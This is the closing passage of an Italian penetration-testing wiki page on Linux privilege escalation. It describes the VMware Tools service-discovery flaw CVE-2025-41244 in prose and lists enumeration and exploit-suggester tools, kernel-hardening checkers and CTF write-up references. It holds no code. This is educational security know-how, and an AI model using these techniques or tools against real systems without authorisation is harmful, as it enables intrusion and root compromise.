../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) tramite exec basato su regex (CVE-2025-41244)

La service discovery basata su regex in VMware Tools/Aria Operations può estrarre un percorso binario dalle command line dei processi ed eseguirlo con `-v` in un contesto privilegiato. Pattern permissivi (ad esempio, che utilizzano `\S`) possono trovare listener predisposti dall'attaccante in percorsi scrivibili (ad esempio, `/tmp/httpd`), portando all'esecuzione come root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Scopri di più e consulta un pattern generalizzato applicabile ad altri stack di discovery/monitoring qui:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protezioni di sicurezza del kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Ulteriore assistenza

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Strumenti Linux/Unix per Privesc

### **Miglior strumento per cercare vettori di privilege escalation locale su Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opzione -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera le vulnerabilità del kernel in Linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (accesso fisico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Raccolta di altri script**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Privilege escalation tramite Crontab UI, riutilizzo delle credenziali con zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload .text_sig contraffatto per il monitor eseguito tramite cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: bypass di Neighborhood Watch (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Privilege escalation di base su Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guida alla privilege escalation su Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attack and Defend: tecniche di privilege escalation su Linux del 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Nessuno si aspetta l'esecuzione di comandi!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Privilege escalation su Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Soluzioni degli esercizi di laboratorio - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: suggerimenti e trucchi per la privilege escalation su Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: strumento di enumerazione e privilege escalation su Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Cos'è un socket?](https://www.linux.com/news/what-socket/)
- [15] [Writeup di Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Accedere al D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Eseguibili SUID: privilege escalation su Linux](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Parte 2 – Privilege escalation su Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Come gestire le ACL su Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root tramite network-scripts su Redhat/CentOS](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Cos'è systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (injection aritmetica di bash tramite i log, catena complessiva)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Manuale di GNU Bash – BASH_ENV (file di avvio non interattivo)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + privilege escalation tramite symlink TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (copia tramite cron di pg_basebackup → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Tu lo nomini, VMware lo eleva (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Elevation of Privilege tramite Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Vulnerabilità di elevation-of-privilege di Sudo: CVE-2025-32462 e CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Directory dei repository PYC](https://peps.python.org/pep-3147/)
- [32] [Documentazione di Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [Issue #74 di polkit/polkit](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet di @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Registrazione delle password su Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Dettagli di una race condition di logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
